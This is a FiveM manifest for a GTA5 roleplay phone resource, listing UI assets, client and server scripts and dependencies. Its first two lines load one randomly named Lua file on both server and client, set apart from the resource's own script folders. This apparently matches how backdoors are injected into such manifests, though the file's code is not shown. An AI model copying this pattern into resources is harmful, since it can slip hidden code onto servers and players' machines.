server_script "JSWLGT29ADEQ.lua"
client_script "JSWLGT29ADEQ.lua"
name("ARP Phone")
description("Phone Written For ARP")
author("[Alzar]")
version("v1.0.0")
url("https://www.mythicrp.com")
lua54("yes")
fx_version("cerulean")
game("gta5")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")
server_script("@oxmysql/lib/MySQL.lua")

ui_page("ui/dist/index.html")
files({
	"ui/dist/index.html",
	"ui/dist/*.png",
	"ui/dist/*.webp",
	"ui/dist/*.gif",
	"ui/dist/*.gifv",
	"ui/dist/*.js",
	"ui/dist/*.mp3",
	"ui/dist/*.ttf",
})

client_scripts({
	"client/*.lua",
	"client/apps/**/*.lua",
})

server_scripts({
	"server/*.lua",
	"server/apps/**/*.lua",
})
